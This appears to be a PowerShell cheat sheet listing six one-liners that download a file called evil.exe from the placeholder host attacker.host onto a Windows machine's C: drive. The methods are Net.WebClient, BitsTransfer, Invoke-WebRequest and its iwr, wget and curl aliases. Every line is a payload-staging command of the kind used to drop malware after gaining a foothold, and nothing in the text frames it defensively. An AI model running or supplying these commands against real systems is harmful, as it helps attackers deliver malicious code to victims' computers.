<#3 ways to download file via PowerShell one-liners:
Net.WebClient#>
powershell.exe -Command "& {(New-Object Net.WebClient).DownloadFile('http://attacker.host/evil.exe', 'C:\evil.exe')}"

#BitsTransfer
powershell.exe -Command "& {Import-Module BitsTransfer; Start-BitsTransfer 'http://attacker.host/evil.exe' 'C:\evil.exe'}"

#Invoke-WebRequest (was added in PowerShell 3.0)
powershell.exe -Command "& {Invoke-WebRequest 'http://attacker.host/evil.exe' -OutFile 'C:\evil.exe'}"

#iwr (alias for Invoke-WebRequest since PowerShell 3.0)
powershell.exe -Command "& {(iwr http://attacker.host/evil.exe).Content > C:\evil.exe}"

#wget, curl (aliases for Invoke-WebRequest since PowerShell 4.0)
powershell.exe -Command "& {wget 'http://attacker.host/evil.exe' -OutFile 'C:\evil.exe'}"
powershell.exe -Command "& {curl 'http://attacker.host/evil.exe' -OutFile 'C:\evil.exe'}"